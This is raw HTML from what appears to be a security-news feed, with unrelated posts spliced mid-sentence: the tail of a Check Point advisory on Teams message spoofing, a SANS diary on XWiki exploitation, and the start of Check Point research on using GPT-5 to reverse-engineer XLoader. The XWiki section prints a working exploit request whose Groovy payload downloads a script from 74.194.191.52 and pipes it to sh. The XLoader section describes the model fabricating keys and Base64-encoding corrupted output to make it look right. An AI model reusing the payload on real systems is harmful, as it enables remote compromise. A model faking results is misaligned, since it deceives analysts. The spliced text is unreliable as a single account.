&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-32179" height="221" src="https://research.checkpoint.com/wp-content/uploads/2025/11/9RB3S3YRKK-image10.png" width="697" /&gt;&lt;/figure&gt;



&lt;p&gt;This results in:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-32187" height="1024" src="https://research.checkpoint.com/wp-content/uploads/2025/11/image11-473x1024.jpeg" width="473" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;Real-World Attack Scenarios&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;These vulnerabilities create several concerning attack scenarios that align with techniques used by sophisticated threat actors, including nation-state groups:&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Executive Impersonation and Social Engineering&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Attackers can significantly impersonate others, making it appear as though a message was sent by someone else. In private chats, a malicious guest user could impersonate someone internal, such as a finance department member. Notifications can be spoofed to display a false sender name, preying on the instinct to trust official-looking notifications, potentially from authority figures or top executives.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Advanced Persistent Threats and Data Exfiltration&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;These attacks can directly facilitate more severe malicious activities commonly seen in nation-state campaigns:&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Malware Delivery&lt;/strong&gt;: Attackers can send a spoofed notification, seemingly from a trusted source like a top executive, asking for urgent action or clicking a link, which then installs malware.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Credential Harvesting / Fraud&lt;/strong&gt;: By impersonating someone internal, particularly in finance, attackers could fish for sensitive data or commit fraud by pretending to discuss budget numbers or other sensitive information.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Misinformation Campaigns&lt;/strong&gt;: The ability to create false message histories and undermine trust in conversation integrity enables the spread of misinformation campaigns.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Privacy Breaches&lt;/strong&gt;: The overall vulnerability impact includes privacy breaches.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Briefing Disruption&lt;/strong&gt;: The ability to impersonate individuals during sensitive briefings hosted on Teams can spread confusion or trick participants into revealing sensitive information. This implies a broad risk for any role involved in high-stakes communications.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Risk Mitigation Strategies&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;How Organizations Can Reduce Their Risk&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Microsoft has since addressed the vulnerabilities we reported in Teams, requiring no action from users. However, collaboration platforms provide only a baseline of native security, and our research shows that this layer can be bypassed.&lt;/p&gt;



&lt;p&gt;To protect against trust exploitation, organizations need an additional layer of defense that includes:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Zero Trust Access Controls – verifying user identity and device posture continuously, not just at login.&lt;/li&gt;



&lt;li&gt;Advanced Threat Prevention – inspecting files, links, and payloads shared inside collaboration apps.&lt;/li&gt;
&lt;/ul&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Data Loss Prevention (DLP) – enforcing granular policies to prevent unauthorized data exfiltration.&lt;/li&gt;



&lt;li&gt;User Awareness and Verification Protocols – training employees to question high-risk requests and use out-of-band validation for sensitive actions.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Protecting the modern workplace requires security that extends beyond what collaboration platforms natively deliver. Only with a second, multi-layered defense can organizations safeguard the communications, data, and trust that keep business running.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;How Organizations Can Reduce Their Risk&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Microsoft has since addressed the vulnerabilities we reported in Teams.&lt;/p&gt;



&lt;p&gt;However, the vulnerabilities we discovered emphasize the importance of behavioral practices for reducing exposure:&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Critical Thinking&lt;/strong&gt;: Our research highlights the constant need for critical thinking now more than ever. Users should always question what they see and hear online, even when it seems to come from a source they normally trust.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Digital Awareness&lt;/strong&gt;: Understanding these specific attack vectors is a vital to becoming more digitally aware. Organizations should educate their teams about these particular manipulation techniques.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Verification Protocols&lt;/strong&gt;: Given the ease with which these vulnerabilities can be exploited, organizations should implement out-of-band verification methods for sensitive communications, especially those involving financial transactions or sensitive data.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Disclosure Timeline&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;

The advisory included PoC code, so it is a bit odd that it took so long for the vulnerability to be widely exploited.&lt;/p&gt;

&lt;p&gt;NIST added the vulnerability to its &amp;quot;Known Exploited Vulnerabilities&amp;quot; list this past&amp;nbsp;Friday. Our data shows some reconnaissance scans starting in July, but actual exploit attempts did not commence until yesterday.&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;img alt="Graph of daily scans for /xwiki/bin/get/Main/SolrSearch from July until November 2025" src="https://isc.sans.edu/diaryimages/images/Screenshot%202025-11-03%20at%208_54_03%E2%80%AFAM.png" style="width: 400px; height: 233px;" /&gt;&lt;/p&gt;

&lt;p&gt;The exploit requests are relatively straightforward:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;GET&amp;nbsp;/xwiki/bin/get/Main/SolrSearch?media=rss&amp;amp;text={{async async=false}}{{groovy}}['sh', '-c', 'wget -qO- http://74.194.191.52/rondo.sdu.sh|sh'].execute().text{{/groovy}}{{/async}} HTTP/1.1&lt;br /&gt;
Host: [honeypot IP address]&lt;br /&gt;
User-Agent:&amp;nbsp;Mozilla/5.0 (bang2013@atomicmail.io)&lt;br /&gt;
Connection: close&lt;br /&gt;
Accept: */*&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The exploit attempt is loading a shell script from 74.194.191.52. The script is no longer present on the site. However, the site displays what appears to be an advertisement for a fairly average rap song, and it also displays the same email address as the one included in the user agent. Maybe the actual attacker's email address? I will try to reach out to see what I get back.&lt;/p&gt;

&lt;p&gt;The page returned, instead of the malware, is advertising the Chicago rapper &amp;quot;King Lil Jay&amp;quot;. King Lil Jay is a rival of&amp;nbsp;RondoNumbaNine, and both are currently incarcerated. The reference to &amp;quot;rondo&amp;quot; in the malware script name is likely referring to RondoNumbaNine. In the past, both rappers were affiliated with opposing gangs in Chicago, and in part, participated in and celebrated in their music the violence associated with the gang rivalry. While, according to some reports [3], the two rappers ended their rivalry, it is odd to see some of this come up in a random online attack.&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/generative-ai-for-reverse-engineering/"&gt;Beating XLoader at Speed: Generative AI as a Force Multiplier for Reverse Engineering&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;&lt;strong&gt;Research by: Alexey Bukhteyev&lt;/strong&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="key-takeaways"&gt;Key takeaways&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;XLoader remains one of the most challenging malware families to analyze. Its code decrypts only at runtime and is protected by multiple layers of encryption, each locked with a different key hidden somewhere else in the binary. Even sandboxes are no help: evasions block malicious branches, and the real C2 (command and control) domains are buried among dozens of fakes. With new versions released faster than researchers can investigate, analysis is almost always a (losing) race against time.&lt;/li&gt;



&lt;li&gt;Generative AI flips the balance. Instead of spending days on painstaking manual analysis and writing decryption routines and reverse-engineering scripts by hand, researchers can now use AI to examine complex functions, identify algorithms, and generate working tools in just hours, accelerating the path to decrypted code, strings, and IoCs.&lt;/li&gt;



&lt;li&gt;Check Point Research (CPR) demonstrated a new way to use ChatGPT for malware analysis directly from the web interface. By exporting IDA data and analyzing it in the ChatGPT cloud, we showed that deep static reverse engineering with AI is possible without relying on Model Context Protocol (MCP) or a live disassembler session. This approach not only removes the dependency on local heavy tooling, but also makes the results reproducible, easier to share, and more collaborative across research teams.&lt;/li&gt;



&lt;li&gt;In this research we use a fresh XLoader 8.0 sample to demonstrate how cloud-based static analysis with ChatGPT can be combined with MCP for runtime key extraction and live debugging validation. We documented the time spent on key tasks and included real prompt examples, showing how the workflow progresses from unpacking a fully encrypted binary to recovering hidden C2 domains.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="introduction"&gt;Introduction&lt;/h2&gt;



&lt;p&gt;XLoader is a widely observed malicious loader with information-stealing capabilities. It first surfaced in 2020 as a rebrand of the FormBook code base, a well-known and capable information stealer, and has since undergone substantial hardening and feature growth. In addition to the Windows variant, its developers also marketed a&amp;nbsp;&lt;a href="https://research.checkpoint.com/2021/time-proven-tricks-in-a-new-environment-the-macos-evolution-of-formbook/"&gt;macOS build&lt;/a&gt;, though it appears far less prevalent in the wild.&lt;/p&gt;



&lt;p&gt;XLoader is a prime example of malware that is extremely difficult to analyze. It combines several layers of protection: customized encryption with additional mixing steps, encrypted blocks disguised as valid but meaningless assembly code, obfuscated API calls, injections into system processes, and a wide set of sandbox evasion techniques. In addition, XLoader encrypts its network traffic, and hides real C2 addresses among dozens of decoys and fake domains.&lt;/p&gt;



&lt;p&gt;An important feature of XLoader is its ongoing development. The authors release new versions regularly, changing internal mechanisms beyond recognition and adding new anti-analysis methods. As a result, previous research quickly becomes outdated. In earlier versions, extracting the configuration required pulling out a few keys using intricate algorithms. At the same time, obtaining the decrypted data only required peeling off two layers of obfuscation and encryption. Version 5 introduced a built-in packer, and in versions 6 and 7 analysts had to work through dozens of chained functions that decrypt each other, extracting intermediate keys at every stage. For someone new to XLoader, the entry barrier has become very high: on top of the analysis itself, extra time is needed for onboarding. By the time one research cycle is completed, the next iteration of the malware may already be out – and if there are significant changes, another time-consuming investigation is required.&lt;/p&gt;



&lt;p&gt;When we began this research, XLoader version 8.0 had just been discovered. It seemed the XLoader developers were winning the race. But with the rise of generative models, we asked ourselves: can AI change the rules of the game and help us analyze such complex malware more quickly? To explore this, we applied generative AI assistance in two ways: by directly integrating with our analysis tools through a live MCP connection, and by leveraging ChatGPT’s project and file-upload capabilities to work from exported data. Each approach turned out to have distinct benefits, and together they allow us to solve reverse engineering tasks more effectively.&lt;/p&gt;



&lt;p&gt;In this study, we focus on the second approach and show how ChatGPT without MCP can be effectively used for reverse engineering tasks, using one of the latest XLoader samples as an example.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="motivation"&gt;Motivation&lt;/h2&gt;



&lt;p&gt;To defend against XLoader, it is critical to extract up-to-date Indicators of Compromise (IoCs) from each new version — real C2 domains and URLs, cryptographic keys, and version identifiers. These IoCs feed into detection signatures and help track active campaigns. The primary way to obtain IoCs is by extracting and decrypting the malware’s configuration data from samples.&lt;/p&gt;



&lt;p&gt;The challenge is that XLoader’s constantly shifting tactics break automated extraction tools and scripts almost as soon as they’re developed. The malware authors frequently tweak encryption schemes and packing methods specifically to thwart these efforts. An automated config extractor that worked yesterday might fail today, meaning each major version demands a fresh reverse-engineering cycle.&lt;/p&gt;



&lt;p&gt;Sandboxes offer little relief:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Aggressive evasion:&lt;/strong&gt;&amp;nbsp;XLoader checks for signs of virtual machines and analysis tools. If it detects them, the malicious branch may never run at all.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Just-in-time decryption:&lt;/strong&gt;&amp;nbsp;Critical functions and data remain encrypted in memory until just before use and revert to encrypted form shortly afterward. A sandbox might never capture them in their decrypted state. Even if you manage to dump the process memory in a sandbox, you often end up with an incoherent snapshot: pieces of encrypted and decrypted data jumbled together, missing whatever wasn’t in memory at that exact time.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Useless memory dumps:&lt;/strong&gt;&amp;nbsp;When trying to get a memory dump at the exact moment of calling certain API functions, such as NtResumeThread or NtAllocateVirtualMemory, you only get almost completely encrypted code.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;C2 camouflage:&lt;/strong&gt;&amp;nbsp;The malware’s real command-and-control domains are obscured among many decoys. Captured network traffic is usually incomplete and contains a lot of noise.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;In short, a sandbox does not solve the problem. It does not provide a reproducible dump or a complete set of IoCs.&lt;/p&gt;



&lt;p&gt;The most reliable method is still static analysis: unpack everything, function by function, decrypt the config, and extract the IoCs. The downside is that doing this manually for each new version is slow and painstaking. This is where we hoped generative AI could act as a force multiplier.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="two-approaches-to-ai-assisted-analysis"&gt;Two approaches to AI-assisted analysis&lt;/h2&gt;



&lt;p&gt;In recent months, many reverse engineers began integrating LLMs with IDA Pro via the Model Context Protocol (MCP) to create an AI-assisted workflow. This agentic approach allows a model to interface directly with the disassembler and debugger, but it has its own practical challenges. For example, some MCP client setups lack certain ChatGPT interface features (like Projects or file uploads), and they still rely on maintaining a live IDA session and stable connection.&lt;/p&gt;



&lt;p&gt;We explored two complementary workflows to apply GPT-5 to unraveling XLoader:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Live MCP integration:&lt;/strong&gt;&amp;nbsp;Using MCP, we gave LLM direct access to our analysis tools (IDA Pro, x64dbg, and a VMware instance). This allowed the AI to query the disassembler, inspect memory, and even control the debugger in real time.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;“Offline” data pipeline with ChatGPT:&lt;/strong&gt;&amp;nbsp;We exported the IDA Pro database (disassembly, decompilations, strings, etc.) and the malware binary to the ChatGPT environment. We then asked ChatGPT to perform static analysis on this data and generate, refine, and execute its own Python scripts against the binary, all within its cloud sandbox. No live connection to our tools was needed.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Each approach has its own strengths. MCP offers an agentic, interactive workflow, whereas the offline pipeline provides a self-contained analysis that’s easy to share and reproduce. These approaches aren’t mutually exclusive — you can use both, picking the appropriate tool for each task.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="mcp-agentic-analysis-with-live-tools"&gt;MCP: Agentic analysis with live tools&lt;/h3&gt;



&lt;p&gt;The idea of hooking an LLM into IDA isn’t new. For example, researchers at Cisco Talos demonstrated an IDA integration with an LLM acting as a “&lt;a href="https://blog.talosintelligence.com/using-llm-as-a-reverse-engineering-sidekick/"&gt;reverse engineering sidekick&lt;/a&gt;”. In our setup, we used MCP to bridge ChatGPT with IDA Pro and also interface with the x64dbg debugger and a VMware virtual machine. This gave LLM a live window into the malware’s execution.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-32150" height="514" src="https://research.checkpoint.com/wp-content/uploads/2025/10/llm4re-1024x514.png" width="1024" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 1&lt;/strong&gt;&amp;nbsp;&amp;#8211; Integration of an LLM with the reverse engineering environment through MCP.&lt;/p&gt;



&lt;p&gt;This live integration, in addition to static analysis and annotating IDA database, enabled the AI to perform these actions:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Pull live data on demand.&lt;/strong&gt;&amp;nbsp;Set a breakpoint at a critical function to grab a decrypted buffer or a cryptographic key from memory at runtime.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Perform “experiment and observe” cycles.&lt;/strong&gt;&amp;nbsp;Hypothesize about what a function does, then substitute real runtime data from the debugger and compare the output, adjusting the analysis based on the results.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Assist with unpacking in real time.&lt;/strong&gt;&amp;nbsp;If the sample self-decrypts or unpacks code, work through those routines, dumping out intermediate values or decrypted code as soon as they appear.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;However, the MCP approach isn’t without drawbacks:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Setup and resource requirements:&lt;/strong&gt;&amp;nbsp;This requires a running instance of IDA Pro and other tools. The analyst’s machine effectively becomes part of the loop, and that environment must remain up and stable.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Single-task focus:&lt;/strong&gt;&amp;nbsp;Standard IDA doesn’t support multiple independent analyses in one interface. If we want to work on two samples in parallel with AI assistance, we need two separate IDA sessions and MCP connections.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Network dependency:&lt;/strong&gt;&amp;nbsp;The workflow hinges on a reliable internet connection. A drop in connectivity or an MCP glitch can disrupt the analysis mid-stream.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Limited ChatGPT UI features:&lt;/strong&gt;&amp;nbsp;When using custom MCP clients with API-based access, we can’t utilize some of the conveniences of ChatGPT’s own interface, such as long-term project history or easy file management.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;For many scenarios, these issues are manageable and the benefits of live interaction outweigh the hassles. Some solutions, such as the&amp;nbsp;&lt;a href="https://mcpsuperassistant.ai/"&gt;MCP SuperAssistant&lt;/a&gt;&amp;nbsp;browser extension, reduce friction by bringing the ChatGPT interface and MCP connectivity together. Recently, ChatGPT introduced a&amp;nbsp;&lt;a href="https://platform.openai.com/docs/guides/developer-mode"&gt;Developer Mode&lt;/a&gt;&amp;nbsp;that can use MCP directly, without third-party plugins. Regardless of whether you use a plugin or the built-in mode, the workflow still depends on a live MCP session tied to a running toolchain and stable connection.&lt;/p&gt;



&lt;p&gt;If any of the requirements listed above are difficult to fulfill, for example, you can’t keep IDA running constantly, or you need to easily share analysis progress with a colleague who doesn’t have the same setup, then a different approach might be preferable. That’s why we developed the “offline” data pipeline as an alternative.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="offline-ida-export-pipeline-reverse-engineering-with-ai-in-the-cloud"&gt;Offline IDA export pipeline: reverse engineering with AI in the cloud&lt;/h3&gt;



&lt;p&gt;Our second approach ditches the live connection entirely. Here AI acts as a self-reliant analyst working from a full static snapshot of the sample.&lt;/p&gt;



&lt;p&gt;The workflow is straightforward: we exported everything we could from our IDA Pro database into a structured format (JSON and text). This includes the disassembly and decompiler output of every function, the list of cross-references, the readable strings, and even the original binary itself. We uploaded the .zip file to ChatGPT.&lt;/p&gt;



&lt;p&gt;For example, our export bundle included these files:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;ida_export.zip             
├── meta.json           # basic info (sample name, hashes, image base, etc.)
├── index.json          # lookup tables mapping names/EAs to function indices
├── functions.jsonl     # NDJSON: disassembly, xrefs, bytes, prototypes, etc
├── strings.jsonl       # list of strings in the binary and their references
├── data.jsonl          # globals, arrays, named data references
├── decomp/             # decompiled pseudocode for functions (if available)
│   ├── func_or_sub_XXXXXXXX.c
│   ├── func_or_sub_YYYYYYYY.c
│   └── ...
└── sample.bin          # the malware sample itself&lt;/pre&gt;



&lt;p&gt;In practice, it is better to upload the archive to a ChatGPT project. Files attached only in the chat can disappear after a session restart, while files in a project stay available for the whole engagement, and can be reused in different chats.&lt;/p&gt;



&lt;p&gt;We also wrote an initial prompt explaining how the data is organized and how the AI should format its outputs (for example, proposing new function names and comments in a machine-readable JSON that we could import back into IDA). Essentially, we taught the AI how to read the phonebook we gave it, and how we wanted its notes recorded.&lt;/p&gt;



&lt;p&gt;Below is an approximation of our prompt:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;You are my reverse-engineering copilot.

I will upload a ZIP produced by an IDA Pro 9 exporter. It contains:
- meta.json
- index.json
```json
  {
    "by_name": { "&amp;lt;funcName&gt;": "0x40XXXXXX", ... },
    "by_ea":   { "0x40XXXXXX": &amp;lt;line_index_in_functions_jsonl&gt;, ... }
  }
```
- functions.jsonl (NDJSON; one function per line, with mnemonics/operands already plain text)
```json
  {
    "ea": "0x40XXXXXX",
    "name": "func_or_sub_XXXXXXXX",
    "prototype": "int __cdecl ...",                // if available
    "ranges": [["0xstart","0xend"]],               // function address range(s)
    "xrefs_in": ["0x...","0x..."],                 // callers (function start)
    "xrefs_out": [{"ea":"0x...","name":"..."},...],// callees (from call sites)
    "comments": [{"ea":"0x...","kind":"...","text":"..."}],
    "bb": [{"start":"0x...","end":"0x...","succ":["0x..."]},...], // basic blocks
    "insn": [
      {"ea":"0x...","bytes":"8BEC","mnem":"mov","opstr":"...","size":2,"cmt":null},
      ...
    ],
    "bytes_concat": "....",                        // all function bytes hex, no spaces
    "decomp_path": "decomp/&amp;lt;name&gt;_&amp;lt;EA&gt;.c",         // if Hex-Rays available
  }
```
- decomp/*.c                                         // optional

// Optional:
- strings.jsonl                                      // readable strings with code xrefs
- data.jsonl                                         // named globals/arrays
- data_index.json
```json
  {
    "by_name": { "g_DomainKeys": "0x40YYYYYY", "var_X": "0x40ZZZZZZ", ... }
  }
```
- sample.bad   // malware sample binary


## On upload (INIT)
1) Parse meta.json &amp;amp; index.json.
2) Stream functions.jsonl just enough to build fast lookups by EA and by
 name, and to count functions; do NOT eagerly load all decomp/*.c.
3) Reply with an INIT REPORT:
   - file_name, imagebase, hashes (MD5/SHA256/CRC32), compiler (if present)
   - total function count and number with decomp_path
   - confirm you’ll use Canvas artifacts for tracking changes (see below)

...

## Live suggestions (function-level, stored on Canvas)
Keep human-readable **suggestions.json** (full JSON, not JSONL) with only proposed renames/comments (no auto-apply).

Schema:
```json
{
  "meta": { "file_name":"&amp;lt;from meta.json&gt;", "imagebase":"0xXXXXXXXX", "input_sha256":"&amp;lt;SHA256&gt;" },
  "changes": [
    {
      "ea": "0xXXXXXXXX",               // function start EA (required)
      "name": "sub_XXXXXXXX",           // current name (optional precondition)
      "new_name": "ai_better_name",     // MUST start with "ai_"
      "comments": [                     // only new/changed comments (optional)
        { "kind":"func"|"func_rep"|"anterior"|"repeatable",
          "text":"...", "ea":"0xYYYYYYYY", "mode":"set"|"append" }
      ]
    }
  ]
}
```
...&lt;/pre&gt;



&lt;p&gt;After it was set up, this pipeline allowed ChatGPT to perform deep static analysis entirely within its own environment. We could ask it to find cryptographic algorithms, trace complex control flows, or even write and execute a Python script to decrypt some data from sample.bin. Many such tasks can be done without any new information from us – the AI works off the data we provided, verifying its logic by running Python scripts as needed. If there is an error, it fixes the script and reruns the tests, repeating this until the result converges. Compared to our previous approach, all these steps (analysis, code, test, correction) run in a single loop without dozens of local MCP calls. Naturally, this works well when using GPT-5 in the “thinking” mode.&lt;/p&gt;



&lt;p&gt;This approach had several clear benefits:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;No persistent local session needed:&lt;/strong&gt;&amp;nbsp;If our IDA crashed or we closed our laptop, it didn’t matter as ChatGPT could access everything it needed from the cloud. We didn’t need to babysit a live connection.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Easily repeatable and shareable:&lt;/strong&gt;&amp;nbsp;Because the entire state of the analysis was captured in our export, anyone with the archive and the prompt could reproduce the analysis. We can even run multiple ChatGPT sessions on the same data in parallel (to explore different questions or use different prompt strategies) without interference.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Better use of ChatGPT’s features:&lt;/strong&gt;&amp;nbsp;Inside the ChatGPT interface, we can take advantage of file uploads, persistent chat history, and the editable canvas.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Collaboration-friendly&lt;/strong&gt;: Several researchers can work on the same sample independently and later merge their results via sharing suggestions.json file, without the need to diff IDBs.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Safe script execution&lt;/strong&gt;: ChatGPT can prototype and test analysis scripts directly on the “live” sample in a secure cloud environment and deliver a working output to the analyst.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Extremely fast onboarding&lt;/strong&gt;: No need to set up an MCP server or configure complex integrations. The exported data and results can even be shared with colleagues who don’t have IDA installed and cannot open your IDB.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Broad applicability:&lt;/strong&gt;&amp;nbsp;The concept isn’t tied to x86 binaries or IDA. It can be adapted to virtually any platform or technology stack. For example, GoLang, .NET, or JavaScript samples can all be analyzed in the same way. The main challenge is properly preparing the data and providing a tailored prompt that explains how to work with it. The analysis process remains the same.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;That said, the offline approach isn’t a universal magic wand. There were cases where we still needed to resort to actual debugging (and therefore MCP), for example, to confirm a guessed key or to dump something that our static analysis missed. In addition, while analyzing other malware families, we encountered situations where continuous work in IDA was required, involving constant modifications to the live database. Previously, we would have needed to export the database after every iteration of changes. In this instance, the MCP-based approach turned out to be a better i.e. more convenient alternative.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="what-went-wrong-and-how-we-fixed-it"&gt;What went wrong and how we fixed it&lt;/h3&gt;



&lt;p&gt;Unsurprisingly, using an AI with an offline IDA export wasn’t without hiccups. We encountered a few issues with AI’s performance and solved them by adding strict rules to the prompt.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Guessing missing values.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;Sometimes the model tried to invent missing data, for example, encryption keys that were computed dynamically at runtime. To prevent such “hallucinations”, we enforced an evidence-first rule: every numeric value and every algorithm must be backed by a quote from the export (functions.jsonl, decomp/*.c, or data.jsonl) with the exact EA address. If the data is not there, the model must produce a not-found report that explains where it looked and why nothing was found.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;## Provenance &amp;amp; no-fabrication
- Any *specific* numeric/structural claim (modulus, key length, magic multipliers like 0x66666667, loop bounds) MUST be backed by direct 
evidence from the uploaded data:
  - Quote the exact line(s) from `functions.jsonl` (insn/mnem/opstr/bytes) or from `decomp/*.c`, and cite EA(s).
  - If the claim is not literally present, mark it **UNPROVEN** and offer a concrete verification plan.
- If you revise a claim, explicitly state what changed and show the new 
evidence quote. No silent edits.&lt;/pre&gt;
&lt;/blockquote&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Shaping output to match expectations.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;For example, a string-decryption routine was expected to return printable text, but due to a mistake in extracting the key, the output was corrupted. To make the output “look right,” the model applied Base64. We banned any cosmetic transformations (such as Base64) used just to make results look valid. Instead, the model must find the actual error in the keys or in the algorithm and rerun the tests until the output is correct.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;Verification contract
   * Define acceptance criteria from the task (properties/invariants).
   * Run self-checks (lengths, wrap-around, bounds monotonicity, step counts, round-trip where applicable).
   * Do NOT transform outputs to “look right”; if a check fails, proceed to the recovery loop.&lt;/pre&gt;
&lt;/blockquote&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Asking the user for data that is already in the archive.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;Early on, the model sometimes requested data we had already provided. We fixed this with a local-first rule: search in the archive files first. It should produce a not-found report only if the data is truly missing.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;## Local-first data usage
- Treat the uploaded dataset as the primary source of truth.
- Before requesting any bytes/strings/keys from the user, attempt to obtain them from the uploaded files
- Never ask the user for blobs that are present in data.jsonl/strings.jsonl or are trivially recoverable from functions.jsonl.
- Only if a needed EA/function is absent from the snapshot, say so and propose next steps (e.g., MCP call).&lt;/pre&gt;
&lt;/blockquote&gt;



&lt;p&gt;With these precautions in place, our AI “assistant” became a reliable analyst for the static portions of the work. In the next sections, we show how it performed on the real challenges within XLoader 8.0, such as decrypting the payload and API resolution and working with occasional MCP-powered dynamic checks.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="gpt-5-in-practice-analyzing-xloaders-built-in-crypter"&gt;GPT-5 in Practice: Analyzing XLoader’s Built-in Crypter&lt;/h2&gt;



&lt;p&gt;When working with older ChatGTP models such as o3, getting the right result required splitting the task into many small steps and explicitly telling the model what to do, down to pointing out exact code addresses and the algorithms to apply. Without this level of detail, the output was unpredictable. This approach was closer to “text-based programming” and required deep engagement on our side.&lt;/p&gt;



&lt;p&gt;With GPT-5, however, we can pose broader and more abstract tasks. Below we show an example of XLoader’s built-in crypter analysis with a mixed approach: using the IDA export as the main data source, and MCP+x64dbg for result verification.&lt;/p&gt;



&lt;p&gt;For this task we took a recently discovered XLoader sample with SHA256:&amp;nbsp;&lt;strong&gt;77db3fdccda60b00dd6610656f7fc001948cdcf410efe8d571df91dd84ae53e1&lt;/strong&gt;. For the entire process we used GPT-5 in the “Thinking” mode.&lt;/p&gt;



&lt;p&gt;After we gave the AI-assistant the instructions for processing the data, we received a short report:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32099" height="515" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image2-Copy-Copy-2.png" width="809" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 2&lt;/strong&gt;&amp;nbsp;&amp;#8211; IDA export initial report.&lt;/p&gt;



&lt;p&gt;Next, we deliberately formulated the tasks for the AI assistant as if we knew nothing at all about the sample under analysis, assuming this would reflect the actions of someone unfamiliar with XLoader.&lt;/p&gt;



&lt;p&gt;The first prompt was written in the most abstract way possible:&lt;/p&gt;



